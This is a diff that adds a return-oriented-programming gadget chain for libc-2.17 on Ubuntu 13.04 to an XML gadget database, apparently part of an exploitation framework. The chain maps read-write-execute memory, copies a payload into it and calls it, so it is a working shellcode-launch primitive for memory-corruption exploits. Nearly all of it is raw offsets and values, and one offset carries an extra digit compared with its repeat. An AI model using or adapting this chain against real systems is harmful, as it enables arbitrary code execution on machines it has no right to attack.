@@ -140,4 +140,74 @@
             <gadget offset="0x000f59fb">call eax ; pop ebx ; pop ebp ;;</gadget>
         </gadgets>
     </rop>
+
+    <rop>
+        <compatibility>
+            <target>Ubuntu 13.04</target>
+        </compatibility>
+
+        <!--
+        dpkg -l | grep libc-* ii  libc-bin 2.17-0ubuntu5 i386 Embedded GNU C Library: Binaries
+        b7573000-b7720000 r-xp 00000000 08:01 917528     /lib/i386-linux-gnu/libc-2.17.so
+        b7722000-b7723000 rw-p 001af000 08:01 917528     /lib/i386-linux-gnu/libc-2.17.so
+        -->
+
+        <gadgets base="0">
+            <gadget offset="0x00001aa6">pop edx</gadget>
+            <gadget value ="0x080c5188">mmap64</gadget>
+            <gadget offset="0x0002fa17">xor eax, eax</gadget>
+            <gadget offset="0x0013b978">add eax ecx ; pop ebx ;;</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget offset="0x00083ad1">sub eax, 1</gadget>
+            <gadget offset="0x00083ad1">sub eax, 1</gadget>
+            <gadget offset="0x00083ad1">sub eax, 1</gadget>
+            <gadget offset="0x00083ad1">sub eax, 1</gadget>
+            <gadget offset="0x0002e09f">mov [eax], ecx</gadget>
+            <gadget offset="0x00003729">xchg ebp, eax</gadget>
+            <gadget offset="0x00002fa17">xor eax, eax</gadget>
+            <gadget offset="0x0013b978">add eax ecx ; pop ebx ;;</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget offset="0x0012b870">mov eax [edx] ; add esp 0xc</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget offset="0x000edea4">call eax ; add esp 0x28 ; pop ebx</gadget>
+            <gadget value ="0x00000000">addr</gadget>
+            <gadget value ="0x00000800">payload size</gadget>
+            <gadget value ="0x00000007">PROT_READ | PROT_WRITE | PROT_EXEC</gadget>
+            <gadget value ="0x00000022">MAP_PRIVATE | MAP_ANON</gadget>
+            <gadget value ="0xffffffff">filedes</gadget>
+            <gadget value ="0x00000000">off_t</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+            <gadget offset="0x00115bc5">push esp ; pop ebx ; pop esi</gadget>
+            <gadget value ="0x00000000">Garbage</gadget>
+	        <gadget offset="0x0007fedd">mov edi eax ; mov esi edx ; mov eax [esp+0x4]</gadget>
+            <gadget offset="0x000f15e4">xchg ebx ecx</gadget>
+            <gadget offset="0x0014eb83">mov eax ecx</gadget>
+            <gadget offset="0x0011334a">add eax 0xc ;;</gadget>
+            <gadget offset="0x0011334a">add eax 0xc ;;</gadget>
+            <gadget offset="0x0011334a">add eax 0xc ;;</gadget>
+            <gadget offset="0x0011334a">add eax 0xc ;;</gadget>
+            <gadget offset="0x0011334a">add eax 0xc ;;</gadget>
+            <gadget offset="0x0011334a">add eax 0xc ;;</gadget>
+            <gadget offset="0x0011334a">add eax 0xc ;;</gadget>
+            <gadget offset="0x00113988">add eax 0x8 ;;</gadget>
+            <gadget offset="0x000ceb8c">push eax ; xor eax eax ; pop esi</gadget>
+            <gadget offset="0x0002e8bb">pop ecx ; pop edx ;;</gadget>
+            <gadget value ="0x00000200">payload size (in dwords)</gadget>
+            <gadget value ="0x00000000">garbage</gadget>
+            <gadget offset="0x0007f8fc">rep movsd ; xchg edi eax ; mov esi edx ;; </gadget>
+            <gadget offset="0x0002e8bb">pop ecx ; pop edx ;;</gadget>
+            <gadget value ="0x00000800">payload size</gadget>
+            <gadget value ="0x00000000">garbage</gadget>
+            <gadget offset="0x00145528">sub eax, ecx</gadget>
+            <gadget offset="0x0007ec86">call eax</gadget>
+
+        </gadgets>
+    </rop>
+
 </db>
